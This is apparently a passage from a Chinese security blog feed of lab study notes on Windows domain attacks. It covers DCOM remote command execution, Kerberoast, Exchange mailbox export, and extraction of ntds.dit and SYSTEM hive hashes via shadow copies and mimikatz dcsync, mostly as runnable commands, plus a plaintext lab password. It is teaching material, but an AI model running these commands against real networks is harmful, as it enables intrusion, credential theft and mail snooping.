alt="在这里插入图片描述"><br>因为windows7,server2008默认安装的是powershell2.0，所以它们都不支持Get-CimInstance.可以使用如下命令代替</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-WmiObject -Namespace  ROOT\CIMV2 -Class Win32_DCOMApplication<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605123315602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>使用DCOM执行任意命令</strong><br>在本地启动一个管理员权限的powershell</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>))<br><span class="hljs-variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;Minimzed&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605124258832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>使用DCOM在远程机器上执行命令</strong><br>在使用该方法时，必须使用具有本地管理员权限的账户<br>1.通过ipc$连接远程计算机</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\10.10.10.11 <span class="hljs-string">&quot;274355ZWz&quot;</span> /user:de1ay<br></code></pre></td></tr></table></figure><p>2.调用MMC20.Application远程执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;10.10.10.11&quot;</span>))<br><span class="hljs-variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c c:\one.exe&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br></code></pre></td></tr></table></figure><p>先通过ipc将payload上传到目标机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy one.exe \\10.10.10.11\c$<br></code></pre></td></tr></table></figure><p>在执行上述命令<br><img src="https://img-blog.csdnimg.cn/20210605133633686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上线，并且是管理员权限<br>3.调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[Type]::GetTypeFromCLSID(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="hljs-string">&quot;10.10.10.11&quot;</span>)<br><span class="hljs-variable">$obj</span>=[System.Activator]::CreateInstance(<span class="hljs-variable">$com</span>)<br><span class="hljs-variable">$item</span>=<span class="hljs-variable">$obj</span>.item()<br><span class="hljs-variable">$item</span>.Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c c:\one&quot;</span>,<span class="hljs-string">&quot;c:\windows\system32&quot;</span>,<span class="hljs-variable">$null</span>,0)<br><br></code></pre></td></tr></table></figure><h2 id="SPN在域环境中的应用"><a href="#SPN在域环境中的应用" class="headerlink" title="SPN在域环境中的应用"></a>SPN在域环境中的应用</h2><p>windows域环境是基于微软的活动目录服务工作的，它在网路系统环境中将物理位置分散、所属部门不同的用户进行分组，集中资源管理。有效的地对资源访问控制权限进行细粒度的分配，提高了网路环境的安全性及网络资源统一分配管理的便利性。</p><p>SPN命令的格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">SPN=serviceclass <span class="hljs-string">&quot;/&quot;</span> hostname [<span class="hljs-string">&quot;:&quot;</span>port] [<span class="hljs-string">&quot;/&quot;</span> servicename]<br> <br>serviceclass 服务组件的名称<br>hostname 以<span class="hljs-string">&quot;/&quot;</span>与面的名称分隔，是计算机的FQDN（全限定域名，同时带有计算机名和域名)<br>port  以冒号分隔，后面的内容为该服务监听的端口<br>servicename  一个字符串，可以是服务的专有名称<br></code></pre></td></tr></table></figure><p>常见的SPN服务<br>mssql服务的示列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSSQLSvc/computer1.pentest.com:1433<br>MSSQLSvc  服务组件的名称，此处为mssql服务<br>computer.pentest.com 主机名为computer,域名为pentest.com<br>1433 监听端口为1433<br></code></pre></td></tr></table></figure><p>servicecass和hostname是必选参数,port和servicename是可选参数</p><ul><li><strong>SPN扫描的powershell脚本</strong><br><a href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a><br>SPN扫描也称作“扫描Kerberos服务实例名称”<br><img src="https://img-blog.csdnimg.cn/20210605145845201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里面有很多扫描spn服务的脚本也有扫描所有服务的<br>1.扫描mssql服务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-moudle .\Discover-PSMSSQL-Servers.ps1<br>Discover-PSMSSQLServers<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605150153434.png" alt="在这里插入图片描述"><br>2.扫描所有服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-module .\Discover-PSInteresestingServices.ps1<br>Discover-PSInteresestingServices<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021060515041918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在不使用第三方powershell脚本的情况下,输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T domain -q */*<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605151129866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>Kerberoast攻击分析与防范</strong><br>1.配置mssql服务 ，破解该服务的票据<br>手动注册</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -A MSSQLSvc/computer.de1ay.com:1433  mssql<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605160525756.png" alt="在这里插入图片描述"><br>2.查看用户对应的SPN<br>查看指定用户注册的SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -L de1ay.com\mssql<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605160716988.png" alt="在这里插入图片描述"><br>查看所有注册的SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T domain -q */*<br></code></pre></td></tr></table></figure><p>3.配置指定服务的登录权限<br>在活动目录中为用户配置指定服务的登录权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpedit.msc \Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment\Log on as a service <br></code></pre></td></tr></table></figure><p>4.修改加密类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpedit.msc\Computer Configuration\Windows Setting\Security Settings\Local Policies\Seurity Options\Network security: Configure encryption types allowed <span class="hljs-keyword">for</span> Kerberos<br></code></pre></td></tr></table></figure><p>5.请求SPN Kerberos票据<br>打开powershell输入如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Add-Type -AssemblyName System.IdentityModel <br>New-Object System.IdentityModel.Tokens.KerberosRequestor SecurityToken -ArgumentList <span class="hljs-string">&quot;MSSQLSvc/de1ay.de1ay.com&quot;</span><br></code></pre></td></tr></table></figure><p>两篇干货文章</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA%3D%3D&amp;chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&amp;idx=1&amp;mid=2247488936&amp;scene=21&amp;sn=82c127c8ad6d3e36f1a977e5ba122228<span class="hljs-comment">#wechat_redirect</span><br><br>https://blog.csdn.net/shuteer_xu/article/details/106030671<br><br></code></pre></td></tr></table></figure><h2 id="Exchange邮件服务"><a href="#Exchange邮件服务" class="headerlink" title="Exchange邮件服务"></a>Exchange邮件服务</h2><ul><li><strong>Exchange服务发现</strong><br>1.基于端口发现<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A -O -sV 192.168.43.1<br></code></pre></td></tr></table></figure>2.SPN查询<br>在安装Exchange时，SPN就被注册在活动目录中了。在域环境中通过SPN来发现Exchange服务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T de1ay.com -F -Q */*<br></code></pre></td></tr></table></figure><ul><li><strong>Exchange的基本操作</strong><br>Exchange是一个电子邮件系统，那么其中必然存在数据库。Exchange数据库的后缀为”.edb”。.<br>1.查看邮件数据库<br>在powershell命令行环境中输入<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxDatabase -server <span class="hljs-string">&quot;Exchange1&quot;</span><br></code></pre></td></tr></table></figure>在正常的powershell中没有这条命令的，需要输入如下命令。将Exchange管理单元添加到当前会话。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">add-pssnapin microsoft.exchange*<br></code></pre></td></tr></table></figure><p>可以指定数据库，对其详细信息进行查询。查询数据库物理路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxDatabase -Identity <span class="hljs-string">&#x27;Mailbox Database 188899384&#x27;</span> | Format-List Name,EdbFilePath,LogFolderPath<br></code></pre></td></tr></table></figure><p>2.获取现有用户的邮件地址<br>使用powershell进行查询，列举Exchange中所有的用户及其邮件地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-Mailbox | format-tables Name,WindowsEmaiAddress<br></code></pre></td></tr></table></figure><p>3.查看指定用户的邮箱使用信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">get-mailboxstatistics -identity administrator | select DisplayName,ItemCount,TotalItemSize,LastLogonTime<br></code></pre></td></tr></table></figure><p>4.获取用户邮箱中的邮件数量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalItemSize -Descend<br></code></pre></td></tr></table></figure><ul><li><strong>导出指定的电子邮件</strong><br>Exchange邮件的文件后缀为“.pst”,在Exchange server 2007中导出邮件，需要使用Export-Mailbox命令。在Exchange Server 2010 SP1及以后的版本的Exchange中导出邮件，可以使用 图形化界面，也可以使用powershell<br>1.配置用户导出\导出的权限<br>查看有导入导出权限的用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-ManagementRoleAssignment -role <span class="hljs-string">&quot;Mailbox Import Export&quot;</span> | Format-List RoleAssigneeName<br></code></pre></td></tr></table></figure><p>2.添加权限<br>将Adminstrator用户添加到Mailbox Import Export角色中，就可以通过Powershell导出用户的邮件了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">New-ManagementRoleAssignment -Name <span class="hljs-string">&quot;Import Export_Domain Admins&quot;</span> -User <span class="hljs-string">&quot;Administrator&quot;</span> -Role <span class="hljs-string">&quot;Mailbox Import Export&quot;</span><br></code></pre></td></tr></table></figure><p>3.删除权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Remove-ManagementRoleAssignment  <span class="hljs-string">&quot;Import Export_Domain Admins&quot;</span> -Confirm:<span class="hljs-variable">$false</span><br></code></pre></td></tr></table></figure><p>在将用户添加到角色组中，需要重启Exchange服务器才能执行导出操作</p><ul><li><strong>设置网络共享文件夹</strong><br>不论那种方式导出邮件，都需要将文件放置在UNC（共享文件)路径下</li></ul><p>设置共享文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net share inetpub=c:\inetpub /grant:everyone,full<br></code></pre></td></tr></table></figure><p>设置成功后可以是使用net share查看</p><ul><li><strong>导出用户的电子邮件</strong><br>1.使用powershell导出电子邮件<br>用户的电子邮箱目录一般分为Inbox(收件箱），SentItems（已发送邮件),DeletedItems（已删除邮件),Drafts（草稿)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">New-MailboxExportRequest -Mailbox administrator -FilePath \\10.10.10.11\inetpub\administrator.pst<br></code></pre></td></tr></table></figure><ul><li><strong>管理导出请求</strong><br>不论是使用powershell导出电子邮件，还是图形化都会留下相关信息。<br>在powershell中输入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxExportRequest<br></code></pre></td></tr></table></figure><p>查看导出请求<br>使用如下命令可以将指定用户的已完成导出请求删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Remove-MailboxExportRequest -Identity Administrator\mailboxexport<br></code></pre></td></tr></table></figure><p>使用如下命令可以将所有已完成的导出请求删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域内横向移动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域控制器安全</title>
    <link href="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    <url>/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通常情况下，即使拥有管理员权限，也无法读取域控制器中的C:\windows\NTDS\ntds.dit文件（活动目录始终访问这个文件）。使用windows本地卷影拷贝服务，就可以获得文件的副本。</p><h2 id="使用卷影拷贝服务提取ntds-dit"><a href="#使用卷影拷贝服务提取ntds-dit" class="headerlink" title="使用卷影拷贝服务提取ntds.dit"></a>使用卷影拷贝服务提取ntds.dit</h2><p>在活动目录中，所有的数据都保存在ntds.dit文件中。ntds.dit是一个二进制文件，储存位置为域控制器的%SystemRoot%\ntds\ntds.dit。ntds.dit中包含(但不限于)用户名，散列值，组，GPP，OU等与活动目录相关的信息。它和SAM文件一样，是被Windows操作系统锁定的。</p><ul><li><strong>使用ntdsutil.exe提取ntds.dit</strong><br>ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。使用ntdsutil.exe,可以维护和管理活动目录数据库，控制单个主机操作，创建引用程序目录分区，删除由未使用活动目录安装向导成功降级的域控制器留下的元数据等。该工具默认安装在域控制器上，可以在域控制器上直接操作，也可以通过域内机器在域控制器上远程操作。ntdsutil.exe支持的操作系统由windows server2003,windows server 2008,windwos server  2012。</li></ul><p>在域控制器的命令行环境中输入如下命令，创建快照。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;activate instance ntds&quot;</span> create quit quit<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021060719184545.png" alt="在这里插入图片描述"></p><p>可以看到创建了一个GUID为0c5ecd15-d722-41fa-9e0a-424c4d19ac64的快照</p><p>加载刚刚的快照</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;mount &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607192246797.png" alt="在这里插入图片描述"><br>使用如下命令将文件复制出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy C:\$SNAP_202106071917_VOLUMEC$\windows\ntds\ntds.dit  c:\temp\ntds.dit<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607192837833.png" alt="在这里插入图片描述"><br>输入如下命令将之前加载的快照卸载并删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;unmount &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> <span class="hljs-string">&quot;delete &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607193052856.png" alt="在这里插入图片描述"></p><p>查看当前系统中的所有快照</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;List All&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607193303358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之前创的没有删除所以有这么多</p><ul><li><strong>利用vssadmin提取ntds,dit</strong><br>vssadmin是windows server 2008 及windows 7提供的vss管理工具，可用于创建和删除卷影拷贝，列出卷影拷贝的信息（只能管理系统provider创建的卷影拷贝),显示已安装的所有卷影拷贝写入程序(writers)和提供程序(providers)，以及改变卷影拷贝的储存空间。</li></ul><p>创建一个c盘卷影</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vssadmin create shadow /for=c:<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607200157738.png" alt="在这里插入图片描述"></p><p>在创建的卷影拷贝中将ntds.dit复制出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit  c:\ntds.dit<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607211731845.png" alt="在这里插入图片描述"><br>删除卷影</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vssadmin delete shadows /for=c: /quiet<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607211940763.png" alt="在这里插入图片描述"></p><ul><li><strong>利用vssown.vbs脚本提取ntds.dit</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#启动卷影拷贝服务</span><br>cscript vssown.vbs /start<br><span class="hljs-comment">#创建一个c盘的卷影拷贝</span><br>cscript vssown.vbs /create c<br><span class="hljs-comment">#列出当前卷影拷贝</span><br>cscript vssown.vbs /list<br><span class="hljs-comment">#删除卷影拷贝</span><br>cscript vssown.vbs /delete &#123;GUID&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607212823506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210607212924122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后可以通过copy命令将其复制出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit<br></code></pre></td></tr></table></figure><ul><li><strong>使用ntdsutil的IFM创建卷影拷贝</strong><br>在域控制器中以管理员模式打开命令行环境，输入如下命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil <span class="hljs-string">&quot;ac i ntds&quot;</span> <span class="hljs-string">&quot;ifm&quot;</span> <span class="hljs-string">&quot;create full c:/test&quot;</span> q q<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607214834441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210607215620557.png" alt="在这里插入图片描述"><br>将其拖到本地后删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rmdir</span> /s/q <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607215731639.png" alt="在这里插入图片描述"></p><ul><li><strong>使用diskshadow导出ntds.dit</strong><br>在渗透测试中可以使用diskshadow.exe来执行命令。例如将需要执行的命令”exec c:\windows\system32\calc.exe”<br>写入C盘目录下的command.txt文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">diskshadow /s c:\command.txt<br></code></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20210608165550423.png" alt="在这里插入图片描述"></li></ul><p>使用diskshadow.exe也可以用来导出ntds.dit。将如下命令写入一个文本文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> context persistent nowriters<br>add volume c: <span class="hljs-built_in">alias</span> someAlias<br>create<br>expose %someAlias% k:<br><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> /c copy k:\Windows\NTDS\ntds.dit c:\ntds.dit<br>delete shadows all<br>list shadows all<br>reset<br><span class="hljs-built_in">exit</span><br><br><br>diskshadow /s c:\Users\de1ay\Desktop\command.txt<br><br>reg save hklm\system c:\system.hive<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210608170442131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功导出</p><h2 id="导出ntds-dit中散列值"><a href="#导出ntds-dit中散列值" class="headerlink" title="导出ntds.dit中散列值"></a>导出ntds.dit中散列值</h2><ul><li><strong>使用esedbexport恢复ntds.dit</strong><br>1.导出ntds.dit<br>安装好该软件<br><a href="https://github.com/libyal/libesedb/releases/tag/20210424">https://github.com/libyal/libesedb/releases/tag/20210424</a><br>将文件拖入kali中</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">esedbexport -m tables ntds.dit<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210608211537495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.导出散列值</p><p>ntdsxtract</p><ul><li><strong>使用impacket工具包导出散列值</strong></li></ul><p>impacket-secretsdump</p><ul><li><strong>在windows在解析ntds.dit</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\NTDSDumpEx.exe -d ntds.dit -s .\system.hive<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210608223759966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="利用dcsync获取域散列值"><a href="#利用dcsync获取域散列值" class="headerlink" title="利用dcsync获取域散列值"></a>利用dcsync获取域散列值</h2><ul><li><strong>使用mimikatz转储域散列值</strong><br>以域管理员权限打开命令行环境，运行mimikatz。输入如下命令，使用mimikatz导出域内的所有用户及散列值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:de1ay.com /all /csv<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609193413491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用mimikatz的dcsync功能也可以导出指定用户的散列值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 